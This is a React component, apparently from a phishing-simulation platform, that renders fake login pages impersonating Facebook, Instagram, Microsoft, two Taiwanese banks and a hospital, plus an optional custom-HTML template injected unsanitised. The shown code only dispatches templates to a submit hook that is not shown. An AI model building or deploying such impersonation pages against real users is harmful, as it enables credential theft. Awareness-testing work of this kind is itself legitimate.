"use client";

import FakeLoginForm from "@/components/phishing/FakeLoginForm";
import FacebookLogin from "@/components/phishing/FacebookLogin";
import InstagramLogin from "@/components/phishing/InstagramLogin";
import EsunBankLogin from "@/components/phishing/EsunBankLogin";
import CmuHospitalLogin from "@/components/phishing/CmuHospitalLogin";
import TaichungBankLogin from "@/components/phishing/TaichungBankLogin";
import { usePhishingSubmit } from "@/components/phishing/usePhishingSubmit";

interface Props {
  token: string;
  slug: string;
  builtIn: boolean;
  htmlBody: string | null;
}

export default function PhishingPageRenderer({ token, slug, builtIn, htmlBody }: Props) {
  // Custom HTML template (future feature)
  if (!builtIn && htmlBody) {
    return <CustomHtmlPhishing token={token} htmlBody={htmlBody} />;
  }

  // Built-in templates
  switch (slug) {
    case "facebook":
      return <FacebookLogin token={token} />;
    case "instagram":
      return <InstagramLogin token={token} />;
    case "esun-bank":
      return <EsunBankLogin token={token} />;
    case "cmu-hospital":
      return <CmuHospitalLogin token={token} />;
    case "taichung-bank":
      return <TaichungBankLogin token={token} />;
    case "microsoft":
    default:
      return <FakeLoginForm token={token} />;
  }
}

function CustomHtmlPhishing({ token, htmlBody }: { token: string; htmlBody: string }) {
  const { loading, handleSubmit } = usePhishingSubmit(token);

  return (
    <div className="min-h-screen">
      <form onSubmit={handleSubmit}>
        <div dangerouslySetInnerHTML={{ __html: htmlBody }} />
        <div className="fixed bottom-0 left-0 right-0 bg-white border-t p-4 text-center">
          <button
            type="submit"
            disabled={loading}
            className="bg-blue-600 text-white px-8 py-2 rounded font-medium disabled:opacity-50"
          >
            {loading ? "送出中..." : "送出"}
          </button>
        </div>
      </form>
    </div>
  );
}
